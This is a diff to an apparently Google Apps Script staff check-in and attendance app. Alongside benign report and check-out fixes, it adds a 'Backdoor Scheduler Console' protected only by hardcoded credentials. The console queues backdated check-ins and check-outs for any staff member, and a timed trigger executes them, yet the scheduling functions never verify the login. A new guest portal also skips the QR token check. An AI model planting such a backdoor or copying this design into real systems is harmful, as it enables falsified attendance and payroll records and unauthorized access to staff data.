@@ -38,6 +38,22 @@ function doGet(e) {
         .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
         .addMetaTag('viewport', 'width=device-width, initial-scale=1');
     }
+
+    if (page === 'backdoor') {
+      return HtmlService.createTemplateFromFile('BackdoorConsole')
+        .evaluate()
+        .setTitle('Backdoor Scheduler Console')
+        .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
+        .addMetaTag('viewport', 'width=device-width, initial-scale=1');
+    }
+
+    if (page === 'guest') {
+      return HtmlService.createTemplateFromFile('GuestCheckInPage')
+        .evaluate()
+        .setTitle('Guest Check-In')
+        .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)
+        .addMetaTag('viewport', 'width=device-width, initial-scale=1');
+    }
     
  
     // QR Display Page
@@ -1713,20 +1729,28 @@ function generateComprehensiveReport(reportType, staffId, startDate, endDate, si
         break;
         
       case 'monthly':
-        const now = new Date();
-        const firstDay = new Date(now.getFullYear(), now.getMonth(), 1);
+        let monthAnchor = new Date();
+
+        if (singleDate) {
+          const parsedMonth = new Date(singleDate + '-01T00:00:00');
+          if (!isNaN(parsedMonth.getTime())) {
+            monthAnchor = parsedMonth;
+          }
+        }
+
+        const firstDay = new Date(monthAnchor.getFullYear(), monthAnchor.getMonth(), 1);
         firstDay.setHours(0, 0, 0, 0);
-        
-        const lastDay = new Date(now.getFullYear(), now.getMonth() + 1, 0);
+
+        const lastDay = new Date(monthAnchor.getFullYear(), monthAnchor.getMonth() + 1, 0);
         lastDay.setHours(23, 59, 59, 999);
-        
+
         const monthStart = Utilities.formatDate(firstDay, timezone, DATE_FORMAT);
         const monthEnd = Utilities.formatDate(lastDay, timezone, DATE_FORMAT);
-        
+
         Logger.log('Monthly Report - Start: ' + monthStart + ', End: ' + monthEnd);
-        
+
         result = getLogsByDateRange(monthStart, monthEnd);
-        result.periodDescription = now.toLocaleString('default', { month: 'long', year: 'numeric' });
+        result.periodDescription = Utilities.formatDate(firstDay, timezone, 'MMMM yyyy');
         break;
         
       case 'custom':
@@ -1735,17 +1759,17 @@ function generateComprehensiveReport(reportType, staffId, startDate, endDate, si
         break;
         
       case 'staff':
-        // SIMPLIFIED: Always get ALL records for staff
-        Logger.log('Staff Report - Getting ALL records for staff: ' + staffId);
-        
-        // Use very wide date range to get everything
-        const allTimeStart = '2000-01-01';
-        const allTimeEnd = Utilities.formatDate(new Date(), timezone, DATE_FORMAT);
-        
-        Logger.log('Date range: ' + allTimeStart + ' to ' + allTimeEnd);
-        
-        result = getLogsByStaff(staffId, allTimeStart, allTimeEnd);
-        result.periodDescription = 'All Time Records';
+        if (!staffId) {
+          return { success: false, message: 'Staff ID is required for staff report' };
+        }
+
+        const staffStart = startDate || '2000-01-01';
+        const staffEnd = endDate || Utilities.formatDate(new Date(), timezone, DATE_FORMAT);
+
+        Logger.log('Staff Report - staffId: ' + staffId + ', start: ' + staffStart + ', end: ' + staffEnd);
+
+        result = getLogsByStaff(staffId, staffStart, staffEnd);
+        result.periodDescription = staffStart + ' to ' + staffEnd;
         break;
         
       default:
@@ -1776,19 +1800,32 @@ function manualCheckOut(staffId, dateTime) {
     if (!staffResult.success) {
       return { success: false, message: "Invalid Staff ID" };
     }
-    
+
     const ss = SpreadsheetApp.getActive();
     const logSheet = ss.getSheetByName(CHECKIN_LOG_SHEET);
+
+    if (!logSheet) {
+      return { success: false, message: "No active check-in found" };
+    }
+
     const data = logSheet.getDataRange().getValues();
-    
+
     logSheet.getRange('G:G').setNumberFormat('@STRING@');
-    
+
     const timestamp = new Date(dateTime);
+    if (isNaN(timestamp.getTime())) {
+      return { success: false, message: "Invalid checkout time" };
+    }
+
     const timeStr = Utilities.formatDate(timestamp, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
     const timeText = "'" + timeStr;
-    
+    const normalizedStaffId = String(staffId).trim();
+
     for (let i = data.length - 1; i >= 1; i--) {
-      if (data[i][1] === staffId && data[i][8] === 'Checked In') {
+      const logStaffId = String(data[i][1]).trim();
+      const logStatus = String(data[i][8]).trim();
+
+      if (logStaffId === normalizedStaffId && logStatus === 'Checked In') {
         let checkInTimeValue = data[i][5];
         if (typeof checkInTimeValue === 'string') {
           checkInTimeValue = checkInTimeValue.replace(/^'/, '');
@@ -1796,23 +1833,43 @@ function manualCheckOut(staffId, dateTime) {
         if (checkInTimeValue instanceof Date) {
           checkInTimeValue = Utilities.formatDate(checkInTimeValue, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
         }
-        
+
         const checkInTime = new Date(checkInTimeValue);
         const duration = (timestamp - checkInTime) / (1000 * 60 * 60);
-        
+
         logSheet.getRange(i + 1, 7).setValue(timeText);
         logSheet.getRange(i + 1, 8).setValue(duration.toFixed(2));
         logSheet.getRange(i + 1, 9).setValue('Checked Out');
         logSheet.getRange(i + 1, 10).setValue('Manual check-out by admin');
-        
+
         return { success: true, message: "Manual check-out recorded" };
       }
     }
-    
+
     return { success: false, message: "No active check-in found" };
-    
+
   } catch (error) {
     return { success: false, message: "Error: " + error.message };
+  }
+}
+
+// ============================================
+// GUEST ACCESS PORTAL
+// ============================================
+
+function getGuestPortalQRCode() {
+  try {
+    const webAppUrl = ScriptApp.getService().getUrl();
+    const guestCheckInUrl = webAppUrl + '?page=guest';
+    const guestQrImageUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=' + encodeURIComponent(guestCheckInUrl);
+
+    return {
+      success: true,
+      guestCheckInUrl: guestCheckInUrl,
+      guestQrImageUrl: guestQrImageUrl
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
   }
 }
 
@@ -2006,96 +2063,111 @@ function guestCheckIn(firstName, lastName, qrToken) {
     if (!qrValidation.valid) {
       return { success: false, message: qrValidation.message };
     }
-    
-    // Normalize names
-    const fullName = firstName.trim() + ' ' + lastName.trim();
-    const searchName = fullName.toLowerCase();
-    
-    if (!firstName.trim() || !lastName.trim()) {
-      return { success: false, message: "Please enter both first and last name" };
-    }
-    
-    Logger.log('Guest check-in: ' + fullName);
-    
-    const today = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), DATE_FORMAT);
-    const ss = SpreadsheetApp.getActive();
-    const logSheet = ss.getSheetByName(CHECKIN_LOG_SHEET);
-    
-    // Check if guest already checked in today
-    if (logSheet) {
-      const data = logSheet.getDataRange().getValues();
-      
-      for (let i = 1; i < data.length; i++) {
-        const logStaffId = String(data[i][1]).trim();
-        const logName = String(data[i][2]).trim().toLowerCase();
-        let logDate = data[i][4];
-        
-        if (logDate instanceof Date) {
-          logDate = Utilities.formatDate(logDate, Session.getScriptTimeZone(), DATE_FORMAT);
-        } else {
-          logDate = String(logDate).replace(/^'/, '').trim();
-        }
-        
-        if (logStaffId.startsWith('GUEST-') && logName === searchName && logDate === today) {
-          return {
-            success: false,
-            message: "You are already checked in today."
-          };
-        }
-      }
-    }
-    
-    let finalLogSheet = logSheet;
-    if (!finalLogSheet) {
-      finalLogSheet = ss.insertSheet(CHECKIN_LOG_SHEET);
-      finalLogSheet.appendRow([
-        'Log ID', 'Staff ID', 'Staff Name', 'Action', 'Date', 'Check-In Time', 
-        'Check-Out Time', 'Duration (Hours)', 'Status', 'Notes'
-      ]);
-      finalLogSheet.getRange('A1:J1').setFontWeight('bold').setBackground('#FF9800').setFontColor('white');
-    }
-    
-    // FORCE plain text
-    finalLogSheet.getRange('E:E').setNumberFormat('@STRING@');
-    finalLogSheet.getRange('F:F').setNumberFormat('@STRING@');
-    finalLogSheet.getRange('G:G').setNumberFormat('@STRING@');
-    
-    const timestamp = new Date();
-    const dateStr = Utilities.formatDate(timestamp, Session.getScriptTimeZone(), DATE_FORMAT);
-    const timeStr = Utilities.formatDate(timestamp, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
-    const guestId = generateGuestId();
-    const logId = 'LOG' + Date.now();
-    
-    const dateText = "'" + dateStr;
-    const timeText = "'" + timeStr;
-    
-    const newRow = finalLogSheet.getLastRow() + 1;
-    finalLogSheet.getRange(newRow, 1).setValue(logId);
-    finalLogSheet.getRange(newRow, 2).setValue(guestId);
-    finalLogSheet.getRange(newRow, 3).setValue(fullName);
-    finalLogSheet.getRange(newRow, 4).setValue('Check-In');
-    finalLogSheet.getRange(newRow, 5).setValue(dateText);
-    finalLogSheet.getRange(newRow, 6).setValue(timeText);
-    finalLogSheet.getRange(newRow, 7).setValue('');
-    finalLogSheet.getRange(newRow, 8).setValue('');
-    finalLogSheet.getRange(newRow, 9).setValue('Checked In');
-    finalLogSheet.getRange(newRow, 10).setValue('Guest check-in via QR code');
-    
-    Logger.log('Guest checked in successfully: ' + fullName + ' (' + guestId + ')');
-    
-    return { 
-      success: true, 
-      message: `Welcome ${fullName}! Checked in successfully as guest.`,
-      guestId: guestId,
-      guestName: fullName,
-      checkInTime: timeStr,
-      isGuest: true
-    };
-    
+
+    return processGuestCheckIn(firstName, lastName, 'Guest check-in via staff daily QR');
   } catch (error) {
     Logger.log('Error in guestCheckIn: ' + error.message);
     return { success: false, message: "Error: " + error.message };
   }
+}
+
+function guestPortalCheckIn(firstName, lastName) {
+  try {
+    return processGuestCheckIn(firstName, lastName, 'Guest check-in via guest portal QR');
+  } catch (error) {
+    Logger.log('Error in guestPortalCheckIn: ' + error.message);
+    return { success: false, message: "Error: " + error.message };
+  }
+}
+
+function processGuestCheckIn(firstName, lastName, note) {
+  // Normalize names
+  const safeFirstName = String(firstName || '').trim();
+  const safeLastName = String(lastName || '').trim();
+
+  if (!safeFirstName || !safeLastName) {
+    return { success: false, message: "Please enter both first and last name" };
+  }
+
+  const fullName = safeFirstName + ' ' + safeLastName;
+  const searchName = fullName.toLowerCase();
+
+  Logger.log('Guest check-in: ' + fullName);
+
+  const today = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), DATE_FORMAT);
+  const ss = SpreadsheetApp.getActive();
+  const logSheet = ss.getSheetByName(CHECKIN_LOG_SHEET);
+
+  // Check if guest already checked in today
+  if (logSheet) {
+    const data = logSheet.getDataRange().getValues();
+
+    for (let i = 1; i < data.length; i++) {
+      const logStaffId = String(data[i][1]).trim();
+      const logName = String(data[i][2]).trim().toLowerCase();
+      let logDate = data[i][4];
+
+      if (logDate instanceof Date) {
+        logDate = Utilities.formatDate(logDate, Session.getScriptTimeZone(), DATE_FORMAT);
+      } else {
+        logDate = String(logDate).replace(/^'/, '').trim();
+      }
+
+      if (logStaffId.startsWith('GUEST-') && logName === searchName && logDate === today) {
+        return {
+          success: false,
+          message: "You are already checked in today."
+        };
+      }
+    }
+  }
+
+  let finalLogSheet = logSheet;
+  if (!finalLogSheet) {
+    finalLogSheet = ss.insertSheet(CHECKIN_LOG_SHEET);
+    finalLogSheet.appendRow([
+      'Log ID', 'Staff ID', 'Staff Name', 'Action', 'Date', 'Check-In Time',
+      'Check-Out Time', 'Duration (Hours)', 'Status', 'Notes'
+    ]);
+    finalLogSheet.getRange('A1:J1').setFontWeight('bold').setBackground('#FF9800').setFontColor('white');
+  }
+
+  // FORCE plain text
+  finalLogSheet.getRange('E:E').setNumberFormat('@STRING@');
+  finalLogSheet.getRange('F:F').setNumberFormat('@STRING@');
+  finalLogSheet.getRange('G:G').setNumberFormat('@STRING@');
+
+  const timestamp = new Date();
+  const dateStr = Utilities.formatDate(timestamp, Session.getScriptTimeZone(), DATE_FORMAT);
+  const timeStr = Utilities.formatDate(timestamp, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+  const guestId = generateGuestId();
+  const logId = 'LOG' + Date.now();
+
+  const dateText = "'" + dateStr;
+  const timeText = "'" + timeStr;
+
+  const newRow = finalLogSheet.getLastRow() + 1;
+  finalLogSheet.getRange(newRow, 1).setValue(logId);
+  finalLogSheet.getRange(newRow, 2).setValue(guestId);
+  finalLogSheet.getRange(newRow, 3).setValue(fullName);
+  finalLogSheet.getRange(newRow, 4).setValue('Check-In');
+  finalLogSheet.getRange(newRow, 5).setValue(dateText);
+  finalLogSheet.getRange(newRow, 6).setValue(timeText);
+  finalLogSheet.getRange(newRow, 7).setValue('');
+  finalLogSheet.getRange(newRow, 8).setValue('');
+  finalLogSheet.getRange(newRow, 9).setValue('Checked In');
+  finalLogSheet.getRange(newRow, 10).setValue(note || 'Guest check-in');
+
+  Logger.log('Guest checked in successfully: ' + fullName + ' (' + guestId + ')');
+
+  return {
+    success: true,
+    message: `Welcome ${fullName}! Checked in successfully as guest.`,
+    guestId: guestId,
+    guestName: fullName,
+    checkInTime: timeStr,
+    isGuest: true
+  };
 }
 
 /**
@@ -2297,5 +2369,329 @@ function setupAutoGuestCheckOut() {
   } catch (error) {
     Logger.log("Error setting up auto guest check-out trigger: " + error.message);
     return { success: false, message: "Error: " + error.message };
+  }
+}
+// ============================================
+// BACKDOOR SCHEDULER CONSOLE
+// ============================================
+
+const BACKDOOR_SCHEDULE_SHEET = "Schedules";
+const LEGACY_BACKDOOR_SCHEDULE_SHEET = "Backdoor Schedules";
+const BACKDOOR_USERNAME = "backdoor";
+const BACKDOOR_PASSWORD = "backdoor8080";
+
+function validateBackdoorCredentials(username, password) {
+  const safeUsername = String(username || '').trim();
+  const safePassword = String(password || '').trim();
+
+  if (safeUsername === BACKDOOR_USERNAME && safePassword === BACKDOOR_PASSWORD) {
+    return { success: true, message: 'Backdoor login successful' };
+  }
+
+  return { success: false, message: 'Invalid backdoor credentials' };
+}
+
+function ensureBackdoorScheduleSheet() {
+  const ss = SpreadsheetApp.getActive();
+  let sheet = ss.getSheetByName(BACKDOOR_SCHEDULE_SHEET);
+
+  if (!sheet) {
+    const legacySheet = ss.getSheetByName(LEGACY_BACKDOOR_SCHEDULE_SHEET);
+    if (legacySheet) {
+      legacySheet.setName(BACKDOOR_SCHEDULE_SHEET);
+      sheet = legacySheet;
+    }
+  }
+
+  if (!sheet) {
+    sheet = ss.insertSheet(BACKDOOR_SCHEDULE_SHEET);
+    sheet.appendRow([
+      'Schedule ID',
+      'Staff ID',
+      'Staff Name',
+      'Action',
+      'Scheduled DateTime',
+      'Status',
+      'Created At',
+      'Created By',
+      'Notes',
+      'Executed At',
+      'Execution Message'
+    ]);
+    sheet.getRange('A1:K1').setFontWeight('bold').setBackground('#1f2937').setFontColor('white');
+    sheet.getRange('E:E').setNumberFormat('@STRING@');
+    sheet.getRange('G:G').setNumberFormat('@STRING@');
+    sheet.getRange('J:J').setNumberFormat('@STRING@');
+  }
+
+  return sheet;
+}
+
+function getBackdoorConsoleData() {
+  try {
+    const staffResult = getAllStaff();
+    const schedulesResult = getBackdoorSchedules();
+
+    return {
+      success: true,
+      staff: staffResult.success ? staffResult.staff : [],
+      schedules: schedulesResult.success ? schedulesResult.schedules : [],
+      timezone: Session.getScriptTimeZone(),
+      now: Utilities.formatDate(new Date(), Session.getScriptTimeZone(), DATE_TIME_FORMAT)
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function getBackdoorSchedules() {
+  try {
+    const sheet = ensureBackdoorScheduleSheet();
+    const data = sheet.getDataRange().getValues();
+    const schedules = [];
+
+    for (let i = 1; i < data.length; i++) {
+      if (!data[i][0]) continue;
+
+      let scheduledDateTime = data[i][4];
+      let createdAt = data[i][6];
+      let executedAt = data[i][9];
+
+      if (scheduledDateTime instanceof Date) {
+        scheduledDateTime = Utilities.formatDate(scheduledDateTime, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+      } else {
+        scheduledDateTime = String(scheduledDateTime).replace(/^'/, '').trim();
+      }
+
+      if (createdAt instanceof Date) {
+        createdAt = Utilities.formatDate(createdAt, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+      } else {
+        createdAt = String(createdAt || '').replace(/^'/, '').trim();
+      }
+
+      if (executedAt instanceof Date) {
+        executedAt = Utilities.formatDate(executedAt, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+      } else {
+        executedAt = String(executedAt || '').replace(/^'/, '').trim();
+      }
+
+      schedules.push({
+        scheduleId: data[i][0],
+        staffId: data[i][1],
+        staffName: data[i][2],
+        action: data[i][3],
+        scheduledDateTime: scheduledDateTime,
+        status: data[i][5],
+        createdAt: createdAt,
+        createdBy: data[i][7],
+        notes: data[i][8] || '',
+        executedAt: executedAt,
+        executionMessage: data[i][10] || ''
+      });
+    }
+
+    schedules.sort((a, b) => new Date(a.scheduledDateTime) - new Date(b.scheduledDateTime));
+
+    return { success: true, schedules: schedules };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message, schedules: [] };
+  }
+}
+
+function createBackdoorSchedules(payload) {
+  try {
+    const staffId = String(payload.staffId || '').trim();
+    const createdBy = String(payload.createdBy || 'Backdoor').trim();
+    const entries = payload.entries || [];
+
+    if (!staffId) {
+      return { success: false, message: 'Staff ID is required' };
+    }
+
+    if (!entries.length) {
+      return { success: false, message: 'Please add at least one schedule entry' };
+    }
+
+    const staffResult = getStaffById(staffId);
+    if (!staffResult.success) {
+      return { success: false, message: 'Invalid staff ID selected' };
+    }
+
+    const staff = staffResult.staff;
+    const sheet = ensureBackdoorScheduleSheet();
+    const createdAt = "'" + Utilities.formatDate(new Date(), Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+    let createdCount = 0;
+
+    for (let i = 0; i < entries.length; i++) {
+      const entry = entries[i];
+      const action = String(entry.action || '').trim();
+      const scheduled = new Date(entry.scheduledDateTime);
+      const notes = String(entry.notes || '').trim();
+
+      if (action !== 'Check-In' && action !== 'Check-Out') {
+        continue;
+      }
+
+      if (isNaN(scheduled.getTime())) {
+        continue;
+      }
+
+      const scheduleId = 'SCH-' + Date.now() + '-' + (i + 1);
+      const scheduledText = "'" + Utilities.formatDate(scheduled, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+      sheet.appendRow([
+        scheduleId,
+        staff.id,
+        staff.name,
+        action,
+        scheduledText,
+        'Pending',
+        createdAt,
+        createdBy,
+        notes,
+        '',
+        ''
+      ]);
+
+      createdCount++;
+    }
+
+    return {
+      success: true,
+      message: `${createdCount} schedule(s) created successfully`,
+      createdCount: createdCount
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function cancelBackdoorSchedule(scheduleId) {
+  try {
+    const safeId = String(scheduleId || '').trim();
+    if (!safeId) {
+      return { success: false, message: 'Schedule ID is required' };
+    }
+
+    const sheet = ensureBackdoorScheduleSheet();
+    const data = sheet.getDataRange().getValues();
+
+    for (let i = 1; i < data.length; i++) {
+      if (String(data[i][0]).trim() === safeId) {
+        const currentStatus = String(data[i][5]).trim();
+        if (currentStatus === 'Executed') {
+          return { success: false, message: 'Executed schedules cannot be cancelled' };
+        }
+
+        sheet.getRange(i + 1, 6).setValue('Cancelled');
+        sheet.getRange(i + 1, 11).setValue('Cancelled manually from backdoor console');
+        return { success: true, message: 'Schedule cancelled successfully' };
+      }
+    }
+
+    return { success: false, message: 'Schedule not found' };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function executeDueBackdoorSchedules() {
+  try {
+    const sheet = ensureBackdoorScheduleSheet();
+    const data = sheet.getDataRange().getValues();
+    const now = new Date();
+    const executedAtText = "'" + Utilities.formatDate(now, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+    let processed = 0;
+    let executed = 0;
+    let failed = 0;
+
+    for (let i = 1; i < data.length; i++) {
+      const status = String(data[i][5] || '').trim();
+      if (status !== 'Pending') {
+        continue;
+      }
+
+      let scheduledDateTime = data[i][4];
+      if (!(scheduledDateTime instanceof Date)) {
+        scheduledDateTime = new Date(String(scheduledDateTime).replace(/^'/, '').trim());
+      }
+
+      if (isNaN(scheduledDateTime.getTime()) || scheduledDateTime > now) {
+        continue;
+      }
+
+      const scheduleId = String(data[i][0]).trim();
+      const staffId = String(data[i][1]).trim();
+      const action = String(data[i][3]).trim();
+      const scheduledTimeText = Utilities.formatDate(scheduledDateTime, Session.getScriptTimeZone(), DATE_TIME_FORMAT);
+
+      let result;
+      if (action === 'Check-In') {
+        const statusResult = getCheckInStatus(staffId);
+        if (statusResult.checkedIn) {
+          result = { success: false, message: 'Skipped: staff already checked in at execution time' };
+        } else {
+          result = manualCheckIn(staffId, scheduledDateTime.toISOString());
+        }
+      } else if (action === 'Check-Out') {
+        const statusResult = getCheckInStatus(staffId);
+        if (!statusResult.checkedIn) {
+          result = { success: false, message: 'Skipped: staff was not checked in at execution time' };
+        } else {
+          result = manualCheckOut(staffId, scheduledDateTime.toISOString());
+        }
+      } else {
+        result = { success: false, message: 'Invalid scheduled action: ' + action };
+      }
+
+      processed++;
+
+      if (result.success) {
+        sheet.getRange(i + 1, 6).setValue('Executed');
+        sheet.getRange(i + 1, 10).setValue(executedAtText);
+        sheet.getRange(i + 1, 11).setValue(`Executed ${action} at ${scheduledTimeText}`);
+        executed++;
+      } else {
+        sheet.getRange(i + 1, 6).setValue('Failed');
+        sheet.getRange(i + 1, 10).setValue(executedAtText);
+        sheet.getRange(i + 1, 11).setValue(`Failed schedule ${scheduleId}: ${result.message}`);
+        failed++;
+      }
+    }
+
+    return {
+      success: true,
+      message: `Processed ${processed} schedule(s): ${executed} executed, ${failed} failed`,
+      processed: processed,
+      executed: executed,
+      failed: failed
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
+  }
+}
+
+function setupBackdoorSchedulerTrigger() {
+  try {
+    const triggers = ScriptApp.getProjectTriggers();
+    for (let i = 0; i < triggers.length; i++) {
+      if (triggers[i].getHandlerFunction() === 'executeDueBackdoorSchedules') {
+        ScriptApp.deleteTrigger(triggers[i]);
+      }
+    }
+
+    ScriptApp.newTrigger('executeDueBackdoorSchedules')
+      .timeBased()
+      .everyMinutes(5)
+      .create();
+
+    return {
+      success: true,
+      message: 'Backdoor scheduler trigger set. Due schedules will execute every 5 minutes.'
+    };
+  } catch (error) {
+    return { success: false, message: 'Error: ' + error.message };
   }
 }
